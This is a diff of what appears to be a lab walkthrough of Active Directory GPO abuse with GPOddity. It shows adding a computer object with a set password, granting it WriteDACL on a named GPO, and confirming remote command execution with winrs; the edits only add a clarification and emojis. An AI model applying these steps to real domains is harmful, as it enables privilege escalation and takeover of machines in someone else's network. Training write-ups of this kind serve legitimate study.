@@ -195,7 +195,7 @@ LDAP server claims to have taken the secdescriptor. Have fun
 
 <🔄 Alternative Step🔄>
 
-Alternatively, if we do not have access to any domain users, we can add a computer object and assign `WriteDACL` permissions on the `DevOps Policy` GPO `{0BF8D01C-1F62-4BDC-958C-57140B67D147}` to it.
+Alternatively, if we do not have access to any domain users (in our case `student422`), we can add a computer object and assign `WriteDACL` permissions on the `DevOps Policy` GPO `{0BF8D01C-1F62-4BDC-958C-57140B67D147}` to it.
 
 `add_computer std422-gpattack Secretpass@123`:
 ```
@@ -257,7 +257,7 @@ Leave GPOddity running and **from another Ubuntu WSL session**, create and share
 total 0
 drwxrwxrwx 1 wsluser wsluser 4096 Feb 20 07:47 Machine
 drwxrwxrwx 1 wsluser wsluser 4096 Feb 20 07:47 User
--rwxrwxrwx 1 wsluser wsluser   56 Feb 20 07:47 gpt.ini
+-rwxrwxrwx 1 wsluser wsluser   56 Feb 20 07:47 gpt.ini📌
 ```
 
 `mkdir /mnt/c/AD/Tools/std422-gp`
@@ -336,8 +336,8 @@ The update for this policy is configured to be every 2 minutes in the lab. After
 
 `winrs -r:dcorp-ci cmd: /c "set computername && set username"`:
 ```
-COMPUTERNAME=DCORP-CI
-USERNAME=student422
+COMPUTERNAME=DCORP-CI🖥️
+USERNAME=student422👤
 ```
 🚩
 
